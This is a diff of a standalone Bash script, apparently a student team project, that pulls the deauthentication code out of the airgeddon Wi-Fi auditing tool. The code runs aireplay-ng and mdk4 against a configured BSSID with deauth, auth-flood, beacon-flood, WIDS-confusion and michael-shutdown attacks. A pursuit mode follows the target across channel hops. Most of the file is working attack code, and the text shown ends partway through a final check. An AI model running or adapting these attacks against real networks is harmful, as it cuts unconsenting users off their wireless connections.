@@ -1,30 +1,108 @@
 #!/usr/bin/env bash
 #shellcheck disable=SC2154,SC2034
- 
+
 # ============================================================
 # Deauth Attack - Standalone Script
 # Extracted from wfast.sh (airgeddon)
 # ============================================================
- 
+
+# --- 설정 파일 로드 ---
+_config_file="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/et_config.conf"
+if [ ! -f "${_config_file}" ]; then
+	echo "[!] Config file not found: ${_config_file}" >&2
+	exit 1
+fi
+# shellcheck source=et_config.conf
+# Windows에서 편집된 파일은 줄 끝이 \r\n(CRLF)으로 저장됨.
+# 그냥 source하면 변수 값에 \r이 포함되어 iw 등 명령이 실패함.
+# tr -d '\r'로 \r을 제거한 뒤 소싱하면 어떤 OS에서 편집해도 정상 동작.
+source <(tr -d '\r' < "${_config_file}")
+
+# --- 이 스크립트 고유의 DoS 방식 (config 값을 덮어씀) ---
+et_dos_attack="${et_dos_attack:-Aireplay}"
+dos_pursuit_mode="${dos_pursuit_mode:-0}"
+
 # --- Internal fixed values ---
 mdk_command="mdk4"
 check_kill_needed=1
 interface_airmon_compatible=1
 et_initial_state="Managed"
 ifacemode="Managed"
- 
+
 # --- Internal constants ---
 et_mode="et_deauth"
 AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING:-xterm}"
 AIRGEDDON_DEBUG_MODE="${AIRGEDDON_DEBUG_MODE:-false}"
 AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING="${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"
 AIRGEDDON_5GHZ_ENABLED="${AIRGEDDON_5GHZ_ENABLED:-true}"
- 
+
 tmpdir="/tmp/et_deauth_$$/"
 scriptfolder="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/"
 system_tmpdir="/tmp/"
 airmon="airmon-ng"
 
+channelfile="channel.txt"
+et_processesfile="et_processes.txt"
+hostapd_wpe_file="hostapd-wpe.conf"
+hostapd_file="hostapd.conf"
+
+declare -a et_processes=()
+declare -a dos_pursuit_mode_pids=()
+declare -A interfaces_band_info=()
+declare -A original_macs=()
+spoofed_mac=0
+dos_pursuit_mode_attack_pid=""
+dos_pursuit_mode_scan_pid=""
+mac_spoofing_desired=0
+enterprise_mode=""
+secondary_wifi_interface=""
+
+session_name="airgeddon"
+global_process_pid=""
+
+standard_resolution="1920x1080"
+xratio=6.2
+yratio=13.9
+ywindow_edge_lines=2
+ywindow_edge_pixels=18
+
+# ========================
+# 함수 목록
+# ========================
+# exec_et_deauth()
+# launch_dos_pursuit_mode_attack()
+# get_tmux_process_id()
+# pid_control_pursuit_mode()
+# manage_output()
+# prepare_et_monitor()
+# recalculate_windows_sizes()
+# debug_print()
+# language_strings_handling_messages()
+# kill_dos_pursuit_mode_processes()
+# kill_pid_and_children_recursive()
+# launch_fake_ap()
+# set_spoofed_mac()
+# start_tmux_processes()
+# disable_rfkill()
+# detect_screen_resolution()
+# set_windows_sizes()
+# set_xsizes()
+# set_ypositions()
+# set_ysizes()
+# ========================
+# (추가: 독립 실행을 위해 보강된 함수)
+# physical_interface_finder()
+# check_interface_supported_bands()
+# get_5ghz_band_info_from_phy_interface()
+# detect_distro_window_ratios()
+# set_mode_without_airmon()
+# restore_et_interface()
+# kill_et_windows()
+# kill_tmux_windows()
+# recover_current_channel()
+# _et_cleanup()
+# exec_deauth_attack()
+# ========================
 
 function exec_et_deauth() {
 
@@ -59,6 +137,9 @@ function exec_et_deauth() {
 			;;
 			"et_sniffing_sslstrip2")
 				deauth_scr_window_position=${g4_bottomleft_window}
+			;;
+			"et_deauth")
+				deauth_scr_window_position=${g1_topleft_window}
 			;;
 		esac
 	fi
@@ -106,7 +187,7 @@ function launch_dos_pursuit_mode_attack() {
 	case "${1}" in
 		"${mdk_command} amok attack")
 			dos_delay=1
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${interface}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
@@ -118,7 +199,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"aireplay deauth attack")
 			dos_delay=3
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${interface}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
@@ -130,7 +211,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"auth dos attack")
 			dos_delay=1
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${interface}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
@@ -142,7 +223,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"beacon flood attack")
 			dos_delay=1
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${interface}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n '${essid}' -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
@@ -154,7 +235,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"wids / wips / wds confusion attack")
 			dos_delay=10
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${interface}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e '${essid}' -c ${channel}" "${1} (DoS Pursuit mode)"
@@ -166,7 +247,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"michael shutdown attack")
 			dos_delay=1
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${interface}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
@@ -178,7 +259,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"${mdk_command}")
 			dos_delay=1
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
@@ -189,7 +270,7 @@ function launch_dos_pursuit_mode_attack() {
 			fi
 		;;
 		"Aireplay")
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
@@ -202,7 +283,7 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"Auth DoS")
 			dos_delay=10
-			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_scan="${secondary_wifi_interface:-${interface}}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
 			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
@@ -263,7 +344,7 @@ function launch_dos_pursuit_mode_attack() {
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
 
 	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
-		if [[ -n "${enterprise_mode}" ]] || [[ -n "${et_mode}" ]]; then
+		if [[ -n "${enterprise_mode}" ]] || [[ "${et_mode}" != "et_deauth" ]]; then
 			launch_fake_ap
 		fi
 	fi
@@ -327,7 +408,7 @@ pid_control_pursuit_mode() {
 
 						if [ -n "${enterprise_mode}" ]; then
 							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_wpe_file}" 2> /dev/null
-						elif [ -n "${et_mode}" ]; then
+						elif [ -n "${et_mode}" ] && [ "${et_mode}" != "et_deauth" ]; then
 							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_file}" 2> /dev/null
 						fi
 
@@ -395,6 +476,7 @@ function prepare_et_monitor() {
 	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
 	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
+	iw dev "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
 }
 
 function recalculate_windows_sizes() {
@@ -463,6 +545,11 @@ function debug_print() {
 	return 0
 }
 
+# language_strings()는 airgeddon 본체의 다국어 출력 함수를 호출하는 용도였으나,
+# 단독 실행 스크립트에는 본체가 없으므로 빈 스텁으로 동작시켜 에러 없이 무시되게 한다.
+# (메시지 테이블 자체는 원본 구조를 보존하기 위해 그대로 남겨둠)
+function language_strings() { :; }
+
 function language_strings_handling_messages() {
 
 	declare -gA language_strings_no_file
@@ -480,110 +567,9 @@ function language_strings_handling_messages() {
 	language_strings_no_file["ARABIC"]="خطأ. ملف اللغة غير موجود"
 	language_strings_no_file["CHINESE"]="错误。未找到语言支持文件"
 
-	declare -gA language_strings_file_mismatch
-	language_strings_file_mismatch["ENGLISH"]="Error. The language strings file found mismatches expected version"
-	language_strings_file_mismatch["SPANISH"]="Error. El fichero de traducciones encontrado no es la versión esperada"
-	language_strings_file_mismatch["FRENCH"]="Erreur. Les traductions trouvées ne sont pas celles attendues"
-	language_strings_file_mismatch["CATALAN"]="Error. El fitxer de traduccions trobat no és la versió esperada"
-	language_strings_file_mismatch["PORTUGUESE"]="Erro. O a versão do arquivos de tradução encontrado é a incompatível"
-	language_strings_file_mismatch["RUSSIAN"]="Ошибка. Языковой файл не соответствует ожидаемой версии"
-	language_strings_file_mismatch["GREEK"]="Σφάλμα. Το αρχείο γλωσσών που έχει βρεθεί δεν αντιστοιχεί με την προαπαιτούμενη έκδοση"
-	language_strings_file_mismatch["ITALIAN"]="Errore. Il file delle traduzioni trovato non è la versione prevista"
-	language_strings_file_mismatch["POLISH"]="Błąd. Znaleziony plik tłumaczenia nie jest oczekiwaną wersją"
-	language_strings_file_mismatch["GERMAN"]="Fehler. Die gefundene Übersetzungsdatei ist nicht die erwartete Version"
-	language_strings_file_mismatch["TURKISH"]="Hata. Bulunan çeviri dosyası beklenen sürüm değil"
-	language_strings_file_mismatch["ARABIC"]="خطأ. ملف اللغة غيرمتطابق مع الإصدار المتوقع"
-	language_strings_file_mismatch["CHINESE"]="错误。发现语言支持文件与预期版本不匹配"
-
-	declare -gA language_strings_try_to_download
-	language_strings_try_to_download["ENGLISH"]="airgeddon will try to download the language strings file..."
-	language_strings_try_to_download["SPANISH"]="airgeddon intentará descargar el fichero de traducciones..."
-	language_strings_try_to_download["FRENCH"]="airgeddon va essayer de télécharger les fichiers de traductions..."
-	language_strings_try_to_download["CATALAN"]="airgeddon intentarà descarregar el fitxer de traduccions..."
-	language_strings_try_to_download["PORTUGUESE"]="O airgeddon tentará baixar o arquivo de tradução..."
-	language_strings_try_to_download["RUSSIAN"]="airgeddon попытается загрузить языковой файл..."
-	language_strings_try_to_download["GREEK"]="Το airgeddon θα προσπαθήσει να κατεβάσει το αρχείο γλωσσών..."
-	language_strings_try_to_download["ITALIAN"]="airgeddon cercherá di scaricare il file delle traduzioni..."
-	language_strings_try_to_download["POLISH"]="airgeddon spróbuje pobrać plik tłumaczeń..."
-	language_strings_try_to_download["GERMAN"]="airgeddon wird versuchen, die Übersetzungsdatei herunterzuladen..."
-	language_strings_try_to_download["TURKISH"]="airgeddon çeviri dosyasını indirmeye çalışacak..."
-	language_strings_try_to_download["ARABIC"]="سيحاول airgeddon تنزيل ملف سلاسل اللغة ..."
-	language_strings_try_to_download["CHINESE"]="airgeddon 将尝试下载语言支持文件..."
-
-	declare -gA language_strings_successfully_downloaded
-	language_strings_successfully_downloaded["ENGLISH"]="Language strings file was successfully downloaded"
-	language_strings_successfully_downloaded["SPANISH"]="Se ha descargado con éxito el fichero de traducciones"
-	language_strings_successfully_downloaded["FRENCH"]="Les fichiers traduction ont été correctement téléchargés"
-	language_strings_successfully_downloaded["CATALAN"]="S'ha descarregat amb èxit el fitxer de traduccions"
-	language_strings_successfully_downloaded["PORTUGUESE"]="O arquivo de tradução foi baixado com sucesso"
-	language_strings_successfully_downloaded["RUSSIAN"]="Языковой файл был успешно загружен"
-	language_strings_successfully_downloaded["GREEK"]="Το αρχείο γλωσσών κατέβηκε με επιτυχία"
-	language_strings_successfully_downloaded["ITALIAN"]="Il file delle traduzioni è stato scaricato con successo"
-	language_strings_successfully_downloaded["POLISH"]="Plik z tłumaczeniem został pomyślnie pobrany"
-	language_strings_successfully_downloaded["GERMAN"]="Die Übersetzungsdatei wurde erfolgreich heruntergeladen"
-	language_strings_successfully_downloaded["TURKISH"]="Çeviri dosyası başarıyla indirildi"
-	language_strings_successfully_downloaded["ARABIC"]="تم تنزيل ملف سلاسل اللغة بنجاح"
-	language_strings_successfully_downloaded["CHINESE"]="语言支持文件已成功下载"
-
-	declare -gA language_strings_failed_downloading
-	language_strings_failed_downloading["ENGLISH"]="The language string file can't be downloaded. Check your internet connection or download it manually from ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["SPANISH"]="No se ha podido descargar el fichero de traducciones. Comprueba tu conexión a internet o descárgalo manualmente de ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["FRENCH"]="Impossible de télécharger le fichier traduction. Vérifiez votre connexion à internet ou téléchargez le fichier manuellement ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["CATALAN"]="No s'ha pogut descarregar el fitxer de traduccions. Comprova la connexió a internet o descarrega'l manualment de ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["PORTUGUESE"]="Não foi possível baixar o arquivos de tradução. Verifique a sua conexão com a internet ou baixe manualmente em ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["RUSSIAN"]="Языковой файл не может быть загружен. Проверьте подключение к Интернету или загрузите его вручную с ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["GREEK"]="Το αρχείο γλωσσών δεν μπορεί να κατέβει. Ελέγξτε τη σύνδεση σας με το διαδίκτυο ή κατεβάστε το χειροκίνητα ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["ITALIAN"]="Impossibile scaricare il file delle traduzioni. Controlla la tua connessione a internet o scaricalo manualmente ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["POLISH"]="Nie można pobrać pliku tłumaczenia. Sprawdź połączenie internetowe lub pobierz go ręcznie z ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["GERMAN"]="Die Übersetzungsdatei konnte nicht heruntergeladen werden. Überprüfen Sie Ihre Internetverbindung oder laden Sie sie manuell von ${normal_color}${urlgithub} runter"
-	language_strings_failed_downloading["TURKISH"]="Çeviri dosyası indirilemedi. İnternet bağlantınızı kontrol edin veya manuel olarak indirin ${normal_color}${urlgithub}"
-	language_strings_failed_downloading["ARABIC"]="${normal_color}${urlgithub}${red_color} لا يمكن تنزيل ملف اللغة. تحقق من اتصالك بالإنترنت أو قم بتنزيله يدويًا من"
-	language_strings_failed_downloading["CHINESE"]="无法下载语言支持文件。检查您的互联网连接或从 手动下载 ${normal_color}${urlgithub}"
-
-	declare -gA language_strings_first_time
-	language_strings_first_time["ENGLISH"]="If you are seeing this message after an automatic update, don't be scared! It's probably because airgeddon has different file structure since version 6.1. It will be automatically fixed"
-	language_strings_first_time["SPANISH"]="Si estás viendo este mensaje tras una actualización automática, ¡no te asustes! probablemente es porque a partir de la versión 6.1 la estructura de ficheros de airgeddon ha cambiado. Se reparará automáticamente"
-	language_strings_first_time["FRENCH"]="Si vous voyez ce message après une mise à jour automatique ne vous inquiétez pas! A partir de la version 6.1 la structure de fichier d'airgeddon a changé. L'ajustement se fera automatiquement"
-	language_strings_first_time["CATALAN"]="Si estàs veient aquest missatge després d'una actualització automàtica, no t'espantis! probablement és perquè a partir de la versió 6.1 l'estructura de fitxers de airgeddon ha canviat. Es repararà automàticament"
-	language_strings_first_time["PORTUGUESE"]="Se você está vendo esta mensagem depois de uma atualização automática, não tenha medo! A partir da versão 6.1 da estrutura de arquivos do airgeddon mudou. Isso será corrigido automaticamente"
-	language_strings_first_time["RUSSIAN"]="Если вы видите это сообщение после автоматического обновления, не переживайте! Вероятно, это объясняется тем, что, начиная с версии 6.1, airgeddon имеет другую структуру файлов. Проблема будет разрешена автоматически"
-	language_strings_first_time["GREEK"]="Εάν βλέπετε αυτό το μήνυμα μετά από κάποια αυτόματη ενημέρωση, μην τρομάξετε! Πιθανόν είναι λόγω της διαφορετικής δομής του airgeddon μετά από την έκδοση 6.1. Θα επιδιορθωθεί αυτόματα"
-	language_strings_first_time["ITALIAN"]="Se stai vedendo questo messaggio dopo un aggiornamento automatico, niente panico! probabilmente è perché a partire dalla versione 6.1 é cambiata la struttura dei file di airgeddon. Sarà riparato automaticamente"
-	language_strings_first_time["POLISH"]="Jeśli widzisz tę wiadomość po automatycznej aktualizacji, nie obawiaj się! To prawdopodobnie dlatego, że w wersji 6.1 zmieniła się struktura plików airgeddon. Naprawi się automatycznie"
-	language_strings_first_time["GERMAN"]="Wenn Sie diese Nachricht nach einem automatischen Update sehen, haben Sie keine Angst! Das liegt vermutlich daran, dass ab Version 6.1 die Dateistruktur von airgeddon geändert wurde. Es wird automatisch repariert"
-	language_strings_first_time["TURKISH"]="Otomatik bir güncellemeden sonra bu mesajı görüyorsanız, korkmayın! muhtemelen 6.1 sürümünden itibaren airgeddon dosya yapısı değişmiştir. Otomatik olarak tamir edilecektir"
-	language_strings_first_time["ARABIC"]="إذا كنت ترى هذه الرسالة بعد التحديث التلقائي ، فلا تخف! ربما يرجع السبب في ذلك إلى أن airgeddon له بنية ملفات مختلفة منذ الإصدار 6.1. سيتم إصلاحه تلقائيًا "
-	language_strings_first_time["CHINESE"]="如果您在自动更新后看到此消息，请不要害怕！这可能是因为 airgeddon 从 6.1 版本开始有不同的文件结构。会自动修复"
-
 	declare -gA language_strings_exiting
 	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
-	language_strings_exiting["SPANISH"]="Saliendo de airgeddon script v${airgeddon_version} - Nos vemos pronto! :)"
-	language_strings_exiting["FRENCH"]="Fermeture du script airgeddon v${airgeddon_version} - A bientôt! :)"
-	language_strings_exiting["CATALAN"]="Sortint de airgeddon script v${airgeddon_version} - Ens veiem aviat! :)"
-	language_strings_exiting["PORTUGUESE"]="Saindo do script airgeddon v${airgeddon_version} - Até breve! :)"
-	language_strings_exiting["RUSSIAN"]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
-	language_strings_exiting["GREEK"]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"
-	language_strings_exiting["ITALIAN"]="Uscendo dallo script airgeddon v${airgeddon_version} - A presto! :)"
-	language_strings_exiting["POLISH"]="Wyjście z skryptu airgeddon v${airgeddon_version} - Do zobaczenia wkrótce! :)"
-	language_strings_exiting["GERMAN"]="Sie verlassen airgeddon v${airgeddon_version} - Bis bald! :)"
-	language_strings_exiting["TURKISH"]="airgeddon yazılımından çıkış yapılıyor v${airgeddon_version} - Yakında görüşürüz! :)"
-	language_strings_exiting["ARABIC"]="الخروج من البرنامج airgeddon v${airgeddon_version}- نراكم قريبًا! :)"
-	language_strings_exiting["CHINESE"]="退出 airgeddon 脚本 v${airgeddon_version} - 待会见！ :)"
-
-	declare -gA language_strings_key_to_continue
-	language_strings_key_to_continue["ENGLISH"]="Press [Enter] key to continue..."
-	language_strings_key_to_continue["SPANISH"]="Pulsa la tecla [Enter] para continuar..."
-	language_strings_key_to_continue["FRENCH"]="Pressez [Enter] pour continuer..."
-	language_strings_key_to_continue["CATALAN"]="Prem la tecla [Enter] per continuar..."
-	language_strings_key_to_continue["PORTUGUESE"]="Pressione a tecla [Enter] para continuar..."
-	language_strings_key_to_continue["RUSSIAN"]="Нажмите клавишу [Enter] для продолжения..."
-	language_strings_key_to_continue["GREEK"]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."
-	language_strings_key_to_continue["ITALIAN"]="Premere il tasto [Enter] per continuare..."
-	language_strings_key_to_continue["POLISH"]="Naciśnij klawisz [Enter] aby kontynuować..."
-	language_strings_key_to_continue["GERMAN"]="Drücken Sie die [Enter]-Taste um fortzufahren..."
-	language_strings_key_to_continue["TURKISH"]="Devam etmek için [Enter] tuşuna basın..."
-	language_strings_key_to_continue["ARABIC"]="اضغط على مفتاح [Enter] للمتابعة ..."
-	language_strings_key_to_continue["CHINESE"]="按 [Enter] 键继续..."
+	language_strings_exiting["KOREAN"]="airgeddon 스크립트 v${airgeddon_version} 종료 - 또 봐요! :)"
 }
 
 function kill_dos_pursuit_mode_processes() {
@@ -861,3 +847,219 @@ function set_ysizes() {
 	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
 	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
 }
+
+# ============================================================
+# 독립 실행을 위해 추가된 보조 함수
+# (조원의 et_sniffing_attack.sh와 동일한 패턴)
+# ============================================================
+
+# sysfs symlink을 읽어 네트워크 인터페이스($1)에 대응하는 물리 phy 번호(예: phy0)를 반환
+function physical_interface_finder() {
+	debug_print
+	local phy_iface
+	phy_iface=$(basename "$(readlink "/sys/class/net/${1}/phy80211")" 2> /dev/null)
+	echo "${phy_iface}"
+}
+
+# iw로 물리 인터페이스($1)의 채널 목록을 조회해 5GHz(5180 MHz) 지원 여부를 반환
+function get_5ghz_band_info_from_phy_interface() {
+	debug_print
+	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5180(\.0)? MHz" > /dev/null; then
+		if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
+			return 0
+		else
+			return 2
+		fi
+	fi
+	return 1
+}
+
+function check_interface_supported_bands() {
+	debug_print
+	get_5ghz_band_info_from_phy_interface "${1}"
+	case "$?" in
+		"0")
+			interfaces_band_info["${2},5Ghz_allowed"]=1
+			interfaces_band_info["${2},text"]="2.4GHz, 5GHz"
+		;;
+		"1")
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="2.4GHz"
+		;;
+		"2")
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="2.4GHz, 5GHz (disabled)"
+		;;
+	esac
+}
+
+# /etc/os-release로 배포판을 감지해 xterm 창 크기 비율(xratio, yratio 등)을 배포판별로 설정
+function detect_distro_window_ratios() {
+	debug_print
+	local distro_id=""
+	if [ -f /etc/os-release ]; then
+		distro_id=$(grep -oP '^ID=\K.*' /etc/os-release | tr -d '"' | tr '[:upper:]' '[:lower:]')
+	fi
+	case "${distro_id}" in
+		"kali")
+			xratio=6.2; yratio=13.9; ywindow_edge_lines=2; ywindow_edge_pixels=18  ;;
+		"ubuntu"|"linuxmint")
+			xratio=6.2; yratio=13.9; ywindow_edge_lines=2; ywindow_edge_pixels=18  ;;
+		"debian")
+			xratio=6.2; yratio=13.9; ywindow_edge_lines=2; ywindow_edge_pixels=14  ;;
+		*)
+			xratio=6.2; yratio=13.9; ywindow_edge_lines=2; ywindow_edge_pixels=18  ;;
+	esac
+}
+
+# airmon-ng 없이 iw 명령으로 인터페이스($1)를 monitor 또는 managed 모드로 전환
+function set_mode_without_airmon() {
+	debug_print
+	local error
+	ip link set "${1}" down > /dev/null 2>&1
+	if [ "${2}" = "monitor" ]; then
+		iw "${1}" set monitor control > /dev/null 2>&1
+	else
+		iw "${1}" set type managed > /dev/null 2>&1
+	fi
+	error=$?
+	ip link set "${1}" up > /dev/null 2>&1
+	if [ "${error}" != 0 ]; then
+		return 1
+	fi
+	return 0
+}
+
+# 모니터 인터페이스 삭제 후 인터페이스를 et_initial_state로 복원
+function restore_et_interface() {
+	debug_print
+	echo
+	echo "[*] Restoring interface..."
+	disable_rfkill
+	mac_spoofing_desired=0
+	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1
+	if [ "${et_initial_state}" = "Managed" ]; then
+		set_mode_without_airmon "${interface}" "managed"
+		ifacemode="Managed"
+	else
+		if [ "${interface_airmon_compatible}" -eq 1 ]; then
+			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+			ifacemode="Monitor"
+			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+			if [ "${interface}" != "${new_interface}" ]; then
+				interface=${new_interface}
+				phy_interface=$(physical_interface_finder "${interface}")
+				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+			fi
+		else
+			if set_mode_without_airmon "${interface}" "monitor"; then
+				ifacemode="Monitor"
+			fi
+		fi
+	fi
+}
+
+function kill_tmux_windows() {
+	debug_print
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		tmux kill-window -t "${session_name}:Deauth" 2> /dev/null
+		tmux kill-window -t "${session_name}:Deauth (DoS Pursuit mode)" 2> /dev/null
+	fi
+}
+
+# et_processes 배열에 등록된 모든 deauth 프로세스를 종료
+function kill_et_windows() {
+	debug_print
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		kill_dos_pursuit_mode_processes
+	fi
+	for item in "${et_processes[@]}"; do
+		kill_pid_and_children_recursive "${item}"
+	done
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
+	fi
+}
+
+function recover_current_channel() {
+	debug_print
+	local recovered_channel
+	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
+	if [ -n "${recovered_channel}" ]; then
+		channel="${recovered_channel}"
+	fi
+}
+
+# SIGINT/SIGTERM 핸들러: deauth 프로세스 종료 → 인터페이스 복원 → 임시파일 삭제 순으로 실행
+function _et_cleanup() {
+	echo
+	echo "[*] Stopping Deauth attack..."
+	echo "[*] Killing attack windows..."
+	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
+	echo "[*] Restoring interface..."
+	restore_et_interface
+	echo "[*] Cleaning up temp files..."
+	rm -rf "${tmpdir}" > /dev/null 2>&1
+	echo "[+] Cleanup complete."
+	exit 0
+}
+
+# 메인 공격 함수: deauth 공격만 단독으로 실행
+# Ctrl+C 수신 시 _et_cleanup으로 안전하게 종료
+function exec_deauth_attack() {
+	debug_print
+	trap '_et_cleanup' SIGINT SIGTERM
+
+	mkdir -p "${tmpdir}"
+
+	echo "[*] Starting deauth attack (${et_dos_attack}) on ${bssid}..."
+	exec_et_deauth
+	echo "[+] Deauth started."
+	echo
+	echo "[+] Deauth attack running. Press Ctrl+C to stop."
+	while true; do sleep 1; done
+}
+
+# ============================================================
+# 실행 전 검증
+# ============================================================
+
+echo "[*] Starting Deauth Attack..."
+echo "    Target BSSID : ${bssid}"
+echo "    Channel      : ${channel}"
+echo "    Interface    : ${interface}"
+echo "    DoS method   : ${et_dos_attack}"
+echo
+
+if [ "$(id -u)" -ne 0 ]; then
+	echo "[!] Root privileges required. Run with sudo." >&2
+	exit 1
+fi
+
+if [ -z "${interface}" ] || [ -z "${bssid}" ] || [ -z "${channel}" ]; then
+	echo "[!] Required config values are missing in: ${_config_file}" >&2
+	echo "    Required: interface, bssid, channel" >&2
+	echo "    (Run et_scan.sh first to auto-fill these values)" >&2
+	exit 1
+fi
+
+echo "[*] Checking configuration... OK"
+
+if [ -z "${phy_interface}" ]; then
